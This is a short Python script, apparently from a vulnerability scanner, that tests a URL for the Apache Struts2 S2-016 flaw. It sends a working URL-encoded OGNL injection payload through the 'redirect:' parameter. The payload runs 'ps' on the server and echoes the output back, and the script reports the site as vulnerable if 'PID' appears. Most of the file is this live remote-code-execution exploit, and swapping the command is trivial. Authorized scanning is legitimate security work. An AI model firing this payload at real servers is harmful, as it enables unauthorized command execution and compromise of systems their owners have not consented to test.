# -*- encoding: utf-8 -*-
'''
@File : s2_016.py
@Time : 2019/08/03 22:02:15
@Author : JE2Se 
@Version : 1.0
@Contact : admin@je2se.com
@WebSite : https://www.je2se.com
'''


import requests
from lib import *
import sys

def s2_016(url):
    try:
        exp = '''?redirect:$%7B%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B'ps'%7D)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader%20(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char%5B50000%5D,%23d.read(%23e),%23matt%3d%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println%20(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D'''
        url = url + exp
        res = requests.get(url)
        if "PID" in res.text:
            print(Vcolors.RED +"存在S2-016漏洞~"+ Vcolors.ENDC)
        else:
            print(Vcolors.OKGREEN +"不存在S2-016漏洞~"+ Vcolors.ENDC)
    except:
        print(Vcolors.OKGREEN +"不存在S2-016漏洞~"+ Vcolors.ENDC)